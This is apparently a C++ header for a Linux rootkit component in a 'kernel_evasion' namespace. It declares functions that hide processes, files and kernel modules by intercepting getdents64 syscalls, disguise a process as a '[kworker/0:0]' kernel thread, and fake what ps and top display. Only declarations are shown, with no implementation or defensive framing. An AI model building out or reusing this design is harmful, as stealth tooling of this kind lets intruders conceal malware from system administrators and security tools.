#pragma once

#include "common.h"
#include <vector>
#include <string>

namespace kernel_evasion {

class ArtifactHiding {
public:
    ArtifactHiding();
    ~ArtifactHiding();

    // Hide a process (by PID) from process enumeration
    // Intercepts getdents64 syscall to filter /proc entries
    ErrorCode hide_process(pid_t pid);

    // Unhide a process
    ErrorCode unhide_process(pid_t pid);

    // Hide a file/directory from directory listings
    // Intercepts getdents/getdents64 syscalls
    ErrorCode hide_file(const std::string& file_path);

    // Unhide a file
    ErrorCode unhide_file(const std::string& file_path);

    // Disguise a process as a kernel thread
    // Rewrites process metadata in /proc/[pid]/stat
    ErrorCode disguise_as_kernel_thread(pid_t pid,
                                        const std::string& fake_name = "[kworker/0:0]");

    // Hide a kernel module (remove from lsmod output)
    ErrorCode hide_module(const std::string& module_name);

    // Setup process metadata rewriting
    // Makes 'ps' and 'top' show fake process info
    ErrorCode rewrite_process_metadata(pid_t pid,
                                       const std::string& fake_name,
                                       const std::string& fake_cmdline);

    // List currently hidden artifacts (for testing)
    struct HiddenArtifacts {
        std::vector<pid_t> hidden_processes;
        std::vector<std::string> hidden_files;
        std::vector<std::string> hidden_modules;
    };

    HiddenArtifacts list_hidden_artifacts();

private:
    std::vector<pid_t> hidden_processes_;
    std::vector<std::string> hidden_files_;
    std::vector<std::string> hidden_modules_;

    // Intercept getdents64 syscall handler
    // Must be implemented in kernel module
    static long handle_getdents64(unsigned int fd,
                                  struct linux_dirent64* dirp,
                                  unsigned int count);
};

}  // namespace kernel_evasion
